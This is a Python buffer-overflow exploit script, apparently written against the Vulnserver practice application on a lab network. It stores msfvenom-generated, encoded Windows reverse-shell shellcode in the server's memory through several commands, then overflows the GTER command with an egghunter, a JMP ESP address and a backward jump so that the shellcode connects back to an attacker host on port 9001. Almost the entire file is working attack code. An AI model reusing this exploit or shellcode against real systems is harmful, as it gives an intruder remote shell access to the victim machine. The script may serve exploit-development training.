#!/usr/bin/python3

import sys, socket

host = "192.168.56.102"
port = 9999

egg = b"FSOCFSOC"

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x46\x53\x4f\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=9001 EXITFUNC=thread -e x86/shikata_ga_nai -i 1 -b "\x00" -f python
buf =  b""
buf += b"\xdb\xdc\xd9\x74\x24\xf4\xbb\xbc\x0d\xcf\x76\x5d\x29"
buf += b"\xc9\xb1\x52\x31\x5d\x17\x83\xc5\x04\x03\xe1\x1e\x2d"
buf += b"\x83\xe5\xc9\x33\x6c\x15\x0a\x54\xe4\xf0\x3b\x54\x92"
buf += b"\x71\x6b\x64\xd0\xd7\x80\x0f\xb4\xc3\x13\x7d\x11\xe4"
buf += b"\x94\xc8\x47\xcb\x25\x60\xbb\x4a\xa6\x7b\xe8\xac\x97"
buf += b"\xb3\xfd\xad\xd0\xae\x0c\xff\x89\xa5\xa3\xef\xbe\xf0"
buf += b"\x7f\x84\x8d\x15\xf8\x79\x45\x17\x29\x2c\xdd\x4e\xe9"
buf += b"\xcf\x32\xfb\xa0\xd7\x57\xc6\x7b\x6c\xa3\xbc\x7d\xa4"
buf += b"\xfd\x3d\xd1\x89\x31\xcc\x2b\xce\xf6\x2f\x5e\x26\x05"
buf += b"\xcd\x59\xfd\x77\x09\xef\xe5\xd0\xda\x57\xc1\xe1\x0f"
buf += b"\x01\x82\xee\xe4\x45\xcc\xf2\xfb\x8a\x67\x0e\x77\x2d"
buf += b"\xa7\x86\xc3\x0a\x63\xc2\x90\x33\x32\xae\x77\x4b\x24"
buf += b"\x11\x27\xe9\x2f\xbc\x3c\x80\x72\xa9\xf1\xa9\x8c\x29"
buf += b"\x9e\xba\xff\x1b\x01\x11\x97\x17\xca\xbf\x60\x57\xe1"
buf += b"\x78\xfe\xa6\x0a\x79\xd7\x6c\x5e\x29\x4f\x44\xdf\xa2"
buf += b"\x8f\x69\x0a\x64\xdf\xc5\xe5\xc5\x8f\xa5\x55\xae\xc5"
buf += b"\x29\x89\xce\xe6\xe3\xa2\x65\x1d\x64\x0d\xd1\x25\x11"
buf += b"\xe5\x20\x55\xd8\x4e\xad\xb3\xb0\xa0\xf8\x6c\x2d\x58"
buf += b"\xa1\xe6\xcc\xa5\x7f\x83\xcf\x2e\x8c\x74\x81\xc6\xf9"
buf += b"\x66\x76\x27\xb4\xd4\xd1\x38\x62\x70\xbd\xab\xe9\x80"
buf += b"\xc8\xd7\xa5\xd7\x9d\x26\xbc\xbd\x33\x10\x16\xa3\xc9"
buf += b"\xc4\x51\x67\x16\x35\x5f\x66\xdb\x01\x7b\x78\x25\x89"
buf += b"\xc7\x2c\xf9\xdc\x91\x9a\xbf\xb6\x53\x74\x16\x64\x3a"
buf += b"\x10\xef\x46\xfd\x66\xf0\x82\x8b\x86\x41\x7b\xca\xb9"
buf += b"\x6e\xeb\xda\xc2\x92\x8b\x25\x19\x17\xab\xc7\x8b\x62"
buf += b"\x44\x5e\x5e\xcf\x09\x61\xb5\x0c\x34\xe2\x3f\xed\xc3"
buf += b"\xfa\x4a\xe8\x88\xbc\xa7\x80\x81\x28\xc7\x37\xa1\x78"

buffer = b"\x90" * 40
buffer += egghunter
buffer += b"\x90" * (146 - len(buffer))
buffer += b"\xAF\x11\x50\x62"        # JMP ESP in essfunc.dll
buffer += b"\xEB\x80"                # short jump backwards into larger buffer
buffer += b"C" * (200 - len(buffer))

commands = ["STATS", "RTIME", "LTIME", "SRUN", "TRUN", "GMON", "GDOG", "LTER", "KSTAN"]

#### send egg and shell code for egghunter to execute; iterate over valid server commands ####

for command in commands:
    
    print("[*] attempting to store shellcode in " + command + " command...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    banner = s.recv(1024)
    print(banner.decode())

    shellcode = command.encode() + bytearray(egg) + b"\x90" * 10 + bytearray(buf) + "\r\n".encode()

    s.send(shellcode)
    print(s.recv(1024).decode())
    s.close()

#### send buffer to overwrite EIP and send egghunter ####

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

banner = s.recv(1024)
print(banner.decode())

exploit = "GTER /.:/ ".encode() + bytearray(buffer) + "\r\n".encode()

s.send(exploit)

s.close()